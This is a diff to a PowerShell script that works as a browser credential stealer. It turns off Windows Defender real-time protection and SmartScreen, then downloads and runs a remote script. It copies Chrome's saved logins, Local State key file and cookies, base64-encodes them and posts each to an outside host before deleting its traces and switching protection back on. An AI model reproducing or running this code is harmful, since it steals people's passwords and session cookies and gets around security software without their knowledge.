@@ -1,10 +1,42 @@
-taskkill /IM sqlservr.exe /F
-taskkill /IM w3wp.exe /F
-taskkill /IM msedge.exe /F
-taskkill /IM Batch.exe /F
+# taskkill /IM sqlservr.exe /F
+# taskkill /IM w3wp.exe /F
+# taskkill /IM msedge.exe /F
+# taskkill /IM Batch.exe /F
+
 Set-MpPreference -DisableRealtimeMonitoring $true
+taskkill /IM smartscreen.exe /F
+
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
 iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Get-BrowserData.ps1'))
+
 Get-BrowserData > out.txt
-Invoke-WebRequest -Uri http://lucasz228.us.to:50000 -Method POST -Body @{text=Get-Content out.txt -Raw}
+
+$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("out.txt"))
+echo $base64string > out.txt
+
+Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Default\Login Data" out2.f
+$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("out2.f"))
+echo $base64string > out2.txt
+
+Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Default\Local State" out3.f
+$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("out3.f"))
+echo $base64string > out3.txt
+
+Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Default\Cookies" out4.f
+$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("out4.f"))
+echo $base64string > out4.txt
+
+Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveHistory -Method POST -Body @{text=Get-Content out.txt -Raw}
+Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveLoginData -Method POST -Body @{text=Get-Content out2.txt -Raw}
+Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveLocalState -Method POST -Body @{text=Get-Content out3.txt -Raw}
+Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveCookie -Method POST -Body @{text=Get-Content out4.txt -Raw}
+
+Remove-Item out.txt
+Remove-Item out2.txt
+Remove-Item out3.txt
+Remove-Item out4.txt
+Remove-Item out2.f
+Remove-Item out3.f
+Remove-Item out4.f
+
 Set-MpPreference -DisableRealtimeMonitoring $false
